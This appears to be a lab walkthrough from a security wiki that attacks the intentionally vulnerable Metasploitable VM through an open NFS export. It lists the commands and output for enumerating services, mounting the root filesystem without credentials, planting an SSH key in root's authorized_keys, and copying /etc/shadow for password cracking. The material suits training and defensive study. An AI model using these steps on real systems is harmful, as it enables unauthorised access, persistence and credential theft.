
# Metasploitable/NFS
#### Contents
```
    1 Network File System
        1.1 Abusing
        1.2 Dismount When Finished
    2 Flags
```

#### Network File System

The Metasploitable virtual machine has some network file system ports open, making it wide-open to attacks. (More info on network file systems generally at Linux/NFS)

The Metasploitable machine is at 10.0.0.27.

Start by checking out what network services are running - use the rpcinfo command to do that:
```
# rpcinfo -p 10.0.0.27
```
This will return information about open ports and RPC services. We can see that there is an NFS service listening on port 2049:
  ```
root@morpheus:~# rpcinfo -p 10.0.0.27
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  38085  status
    100024    1   tcp  52004  status
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100021    1   udp  60702  nlockmgr
    100021    3   udp  60702  nlockmgr
    100021    4   udp  60702  nlockmgr
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100021    1   tcp  34385  nlockmgr
    100021    3   tcp  34385  nlockmgr
    100021    4   tcp  34385  nlockmgr
    100005    1   udp  45599  mountd
    100005    1   tcp  42810  mountd
    100005    2   udp  45599  mountd
    100005    2   tcp  42810  mountd
    100005    3   udp  45599  mountd
    100005    3   tcp  42810  mountd
```
Now use the showmount command to show what file systems are mountable on this NFS:
```
root@morpheus:~# showmount -e 10.0.0.27
Export list for 10.0.0.27:
/ *
```
##### Woot - the entire filesystem is mountable/writable!

#### To mount the network filesystem, we need to run the RPC service rpcbind:
```
service rpcbind start
```
Now we can mount the filesystem at the IP address, with no credentials:
```
# mkdir /tmp/r00t
# mount -t nfs 10.0.0.27:/ /tmp/r00t
```
### Abusing

Now we can abuse our write access to the filesystem by copying an SSH key into the remote machine's trusted SSH keys, and obtain passwordless remote access:
```
# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
```
We can copy the shadow file to the local disk to crack with John the Ripper:
```
# cp /tmp/r00t/etc/shadow ~/victim_shadow_file
```
We could also use the Metasploit post modules, for information-gathering on Linux machines.
Dismount When Finished

Dismount when finished to make sure all those goodies you left behind actually end up being written to the disk:
```
# umount /tmp/r00t
```
